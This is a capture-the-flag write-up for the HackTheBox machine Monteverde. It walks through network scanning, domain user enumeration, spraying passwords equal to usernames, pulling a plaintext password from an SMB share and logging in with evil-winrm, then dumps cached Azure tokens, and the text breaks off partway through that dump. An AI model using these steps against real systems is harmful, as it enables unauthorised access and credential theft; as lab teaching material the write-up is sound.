Title:HTB: Monteverde
Date: 06-15-2020 09:00
category:security
tags:security, boot2root, HTB, Windows, SMB, Azure, PHS
meta:security, boot2root, HTB, Windows, SMB, Azure, PHS

<img class="align-left" src="/media/2020.06/monteverde_card.png" alt="Craft card" width="262">

This is a writeup about a retired HacktheBox machine:
[Monteverde](https://www.hackthebox.eu/home/machines/profile/223) published on
January the 11th 2020 by
[egre55](https://www.hackthebox.eu/home/users/profile/1190).
This box is classified as a medium machine. The user part is quit direct and
easy and involve to enumerate a few basic services.
The root part was harder for me as it is based on a specific issue with Azure AD
and Password Hash Synchronisation.

<!-- PELICAN_END_SUMMARY -->

# User

## Recon

We start with an nmap scan. As often with MS Windows Box a lot of ports are
open.

    :::text
    # Nmap 7.80 scan initiated Sun Jan 12 08:35:35 2020 as: nmap -p- -sS -oN nmap_all 10.10.10.172
    Nmap scan report for 10.10.10.172
    Host is up (0.27s latency).
    Not shown: 65516 filtered ports
    PORT      STATE SERVICE
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  adws
    49667/tcp open  unknown
    49669/tcp open  unknown
    49670/tcp open  unknown
    49671/tcp open  unknown
    49699/tcp open  unknown
    49768/tcp open  unknown

    # Nmap done at Sun Jan 12 08:47:28 2020 -- 1 IP address (1 host up) scanned in 712.82 seconds

We run a service scan on the open ports.

    :::text
    # Nmap 7.80 scan initiated Sun Jan 12 08:58:05 2020 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49699,49768 -sSV -oN nmap_sv 10.10.10.172
    Nmap scan report for 10.10.10.172
    Host is up (0.36s latency).

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain?
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 14:07:30Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc         Microsoft Windows RPC
    49671/tcp open  msrpc         Microsoft Windows RPC
    49699/tcp open  msrpc         Microsoft Windows RPC
    49768/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=1/12%Time=5E1B25FA%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Sun Jan 12 09:00:45 2020 -- 1 IP address (1 host up) scanned in 159.60 seconds

## Enum4linux

We run [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) on the box.
We get a list of the box username:
 * Guest
 * mhope
 * roleary
 * SABatchJobs
 * smorgan
 * svc-ata
 * svc-bexec
 * svc-netapp

    :::text
    perl enum4linux.pl 10.10.10.172
    WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
    Starting enum4linux v0.8.9 (https://github.com/CiscoCXSecurity/enum4linux) on Sun Jan 12 09:09:01 2020

    ==========================
    |    Target Information    |
    ==========================
    Target ........... 10.10.10.172
    RID Range ........ 500-550,1000-1050
    Username ......... ''
    Password ......... ''
    Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


    ====================================================
    |    Enumerating Workgroup/Domain on 10.10.10.172    |
    ====================================================
    [E] Can't find workgroup/domain


    ============================================
    |    Nbtstat Information for 10.10.10.172    |
    ============================================
    Looking up status of 10.10.10.172
    No reply from 10.10.10.172

    =====================================
    |    Session Check on 10.10.10.172    |
    =====================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 437.
    [+] Server 10.10.10.172 allows sessions using username '', password ''
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 451.
    [+] Got domain/workgroup name:

    ===========================================
    |    Getting domain SID for 10.10.10.172    |
    ===========================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 359.
    Domain Name: MEGABANK
    Domain Sid: S-1-5-21-391775091-850290835-3566037492
    [+] Host is part of a domain (not a workgroup)

    ======================================
    |    OS information on 10.10.10.172    |
    ======================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 458.
    Use of uninitialized value $os_info in concatenation (.) or string at enum4linux.pl line 464.
    [+] Got OS info for 10.10.10.172 from smbclient:
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 467.
    [+] Got OS info for 10.10.10.172 from srvinfo:
    Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

    =============================
    |    Users on 10.10.10.172    |
    =============================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.
    index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
    index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
    index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
    index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
    index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
    index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
    index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
    index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
    index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
    index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 883.
    user:[Guest] rid:[0x1f5]
    user:[AAD_987d7f2f57d2] rid:[0x450]
    user:[mhope] rid:[0x641]
    user:[SABatchJobs] rid:[0xa2a]
    user:[svc-ata] rid:[0xa2b]
    user:[svc-bexec] rid:[0xa2c]
    user:[svc-netapp] rid:[0xa2d]
    user:[dgalanos] rid:[0xa35]
    user:[roleary] rid:[0xa36]
    user:[smorgan] rid:[0xa37]

    =========================================
    |    Share Enumeration on 10.10.10.172    |
    =========================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 640.

      Sharename       Type      Comment
      ---------       ----      -------
    SMB1 disabled -- no workgroup available

    [+] Attempting to map shares on 10.10.10.172

    ====================================================
    |    Password Policy Information for 10.10.10.172    |
    ====================================================
    [E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from https://labs.portcullis.co.uk/tools/polenum/


    ==============================
    |    Groups on 10.10.10.172    |
    ==============================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

    [+] Getting builtin groups:
    group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
    group:[Incoming Forest Trust Builders] rid:[0x22d]
    group:[Windows Authorization Access Group] rid:[0x230]
    group:[Terminal Server License Servers] rid:[0x231]
    group:[Users] rid:[0x221]
    group:[Guests] rid:[0x222]
    group:[Remote Desktop Users] rid:[0x22b]
    group:[Network Configuration Operators] rid:[0x22c]
    group:[Performance Monitor Users] rid:[0x22e]
    group:[Performance Log Users] rid:[0x22f]
    group:[Distributed COM Users] rid:[0x232]
    group:[IIS_IUSRS] rid:[0x238]
    group:[Cryptographic Operators] rid:[0x239]
    group:[Event Log Readers] rid:[0x23d]
    group:[Certificate Service DCOM Access] rid:[0x23e]
    group:[RDS Remote Access Servers] rid:[0x23f]
    group:[RDS Endpoint Servers] rid:[0x240]
    group:[RDS Management Servers] rid:[0x241]
    group:[Hyper-V Administrators] rid:[0x242]
    group:[Access Control Assistance Operators] rid:[0x243]
    group:[Remote Management Users] rid:[0x244]
    group:[Storage Replica Administrators] rid:[0x246]

    [+] Getting builtin group memberships:
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.

    [+] Getting local groups:
    group:[Cert Publishers] rid:[0x205]
    group:[RAS and IAS Servers] rid:[0x229]
    group:[Allowed RODC Password Replication Group] rid:[0x23b]
    group:[Denied RODC Password Replication Group] rid:[0x23c]
    group:[DnsAdmins] rid:[0x44d]
    group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
    group:[ADSyncAdmins] rid:[0x451]
    group:[ADSyncOperators] rid:[0x452]
    group:[ADSyncBrowse] rid:[0x453]
    group:[ADSyncPasswordSet] rid:[0x454]

    [+] Getting local group memberships:
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 593.

    [+] Getting domain groups:
    group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
    group:[Domain Users] rid:[0x201]
    group:[Domain Guests] rid:[0x202]
    group:[Domain Computers] rid:[0x203]
    group:[Group Policy Creator Owners] rid:[0x208]
    group:[Cloneable Domain Controllers] rid:[0x20a]
    group:[Protected Users] rid:[0x20d]
    group:[DnsUpdateProxy] rid:[0x44e]
    group:[Azure Admins] rid:[0xa29]
    group:[File Server Admins] rid:[0xa2e]
    group:[Call Recording Admins] rid:[0xa2f]
    group:[Reception] rid:[0xa30]
    group:[Operations] rid:[0xa31]
    group:[Trading] rid:[0xa32]
    group:[HelpDesk] rid:[0xa33]
    group:[Developers] rid:[0xa34]

    [+] Getting domain group memberships:
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
    Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
    Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
    Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
    Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
    Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
    Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
    Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
    Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
    Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
    Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
    Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
    Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.
    Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary

    =======================================================================
    |    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
    =======================================================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 710.
    [E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 742.

    =============================================
    |    Getting printer info for 10.10.10.172    |
    =============================================
    Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 995.
    Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


    enum4linux complete on Sun Jan 12 09:15:49 2020

## Testing creds

We put the usernames in a file `users` and we test every account for password
equal username on the SMB service.

The account `SABatchJobs:SABatchJobs` seems to be a valide account.

    :::text
    # while read l; do crackmapexec smb 10.10.10.172 -u $l -p $l --shares; done < users
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\Guest:Guest STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [+] MEGABANK\SABatchJobs:SABatchJobs
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-ata:svc-ata STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-bexec:svc-bexec STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\dgalanos:dgalanos STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\roleary:roleary STATUS_LOGON_FAILURE
    [*] KTHXBYE!
    CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
    CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\smorgan:smorgan STATUS_LOGON_FAILURE
    [*] KTHXBYE!

## SMB as SABatchJobs

We connect to the `Users$` share with our SABatchJobs account. The first user
folder is empty and the second one give us an other account: mhope.

    :::text
    # smbclient //10.10.10.172/Users$ -U "SABatchJobs"%"SABatchJobs"
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D        0  Fri Jan  3 08:12:48 2020
      ..                                  D        0  Fri Jan  3 08:12:48 2020
      dgalanos                            D        0  Fri Jan  3 08:12:30 2020
      mhope                               D        0  Fri Jan  3 08:41:18 2020
      roleary                             D        0  Fri Jan  3 08:10:30 2020
      smorgan                             D        0  Fri Jan  3 08:10:24 2020

        524031 blocks of size 4096. 518419 blocks available
    smb: \> cd mhope\
    smb: \mhope\> ls
      .                                   D        0  Fri Jan  3 08:41:18 2020
      ..                                  D        0  Fri Jan  3 08:41:18 2020
      azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

        524031 blocks of size 4096. 518419 blocks available
    smb: \mhope\> mget azure.xml
    Get file azure.xml? y
    getting file \mhope\azure.xml of size 1212 as azure.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)

    ��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
      <Obj RefId="0">
        <TN RefId="0">
          <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
          <T>System.Object</T>
        </TN>
        <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
        <Props>
          <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
          <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
          <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
          <S N="Password">4n0therD4y@n0th3r$</S>
        </Props>
      </Obj>
    </Objs>

## evil-winrm

We use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect to the
box with our new account. We quickly find the user's flag on the Desktop.

    :::text
    # ruby evil-winrm.rb -u mhope -i 10.10.10.172 -p '4n0therD4y@n0th3r$'

    Evil-WinRM shell v1.8

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
    4961976bd7d8f4eeb2ce3705e2f212f2

# Getting root

## Azure

While enumerating more we found some `.Azure` file containg a few information
about the Azure configuration

    :::text
    *Evil-WinRM* PS C:\Users\mhope\.Azure> ls


        Directory: C:\Users\mhope\.Azure


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----         1/3/2020   5:35 AM                ErrorRecords
    -a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
    -a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
    -a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
    -a----         1/3/2020   5:36 AM           7896 TokenCache.dat

    *Evil-WinRM* PS C:\Users\mhope\.Azure> cat AzurePSDataCollectionProfile.json
    {"enableAzureDataCollection":true}
    *Evil-WinRM* PS C:\Users\mhope\.Azure> cat AzureRmContext.json
    {
      "DefaultContextKey": "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com",
      "EnvironmentTable": {},
      "Contexts": {
        "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com": {
          "Account": {
            "Id": "john@a67632354763outlook.onmicrosoft.com",
            "Credential": null,
            "Type": "User",
            "TenantMap": {},
            "ExtendedProperties": {
              "Tenants": "372efea9-7bc4-4b76-8839-984b45edfb98"
            }
          },
          "Tenant": {
            "Id": "372efea9-7bc4-4b76-8839-984b45edfb98",
            "Directory": null,
            "ExtendedProperties": {}
          },
          "Subscription": null,
          "Environment": {
            "Name": "AzureCloud",
            "OnPremise": false,
            "ServiceManagementUrl": "https://management.core.windows.net/",
            "ResourceManagerUrl": "https://management.azure.com/",
            "ManagementPortalUrl": "https://go.microsoft.com/fwlink/?LinkId=254433",
            "PublishSettingsFileUrl": "https://go.microsoft.com/fwlink/?LinkID=301775",
            "ActiveDirectoryAuthority": "https://login.microsoftonline.com/",
            "GalleryUrl": "https://gallery.azure.com/",
            "GraphUrl": "https://graph.windows.net/",
            "ActiveDirectoryServiceEndpointResourceId": "https://management.core.windows.net/",
            "StorageEndpointSuffix": "core.windows.net",
            "SqlDatabaseDnsSuffix": ".database.windows.net",
            "TrafficManagerDnsSuffix": "trafficmanager.net",
            "AzureKeyVaultDnsSuffix": "vault.azure.net",
            "AzureKeyVaultServiceEndpointResourceId": "https://vault.azure.net",
            "GraphEndpointResourceId": "https://graph.windows.net/",
            "DataLakeEndpointResourceId": "https://datalake.azure.net/",
            "BatchEndpointResourceId": "https://batch.core.windows.net/",
            "AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix": "azuredatalakeanalytics.net",
            "AzureDataLakeStoreFileSystemEndpointSuffix": "azuredatalakestore.net",
            "AdTenant": "Common",
            "VersionProfiles": [],
            "ExtendedProperties": {
              "OperationalInsightsEndpoint": "https://api.loganalytics.io/v1",
              "OperationalInsightsEndpointResourceId": "https://api.loganalytics.io",
              "AzureAnalysisServicesEndpointSuffix": "asazure.windows.net",
              "AnalysisServicesEndpointResourceId": "https://region.asazure.windows.net",
              "AzureAttestationServiceEndpointSuffix": "attest.azure.net",
              "AzureAttestationServiceEndpointResourceId": "https://attest.azure.net"
            }
          },
          "VersionProfile": null,
          "TokenCache": {
            "CacheData": null
          },
          "ExtendedProperties": {}
        }
      },
      "ExtendedProperties": {}
    }
    *Evil-WinRM* PS C:\Users\mhope\.Azure> cat AzureRmContextSettings.json
    {"Mode":"CurrentUser","ContextDirectory":"C:\\Users\\mhope\\.Azure","ContextFile":"AzureRmContext.json","CacheDirectory":"C:\\Users\\mhope\\.Azure","CacheFile":"TokenCache.dat","Settings":{}}
    *Evil-WinRM* PS C:\Users\mhope\.Azure> cat TokenCache.dat
    ‡https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/graph.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVk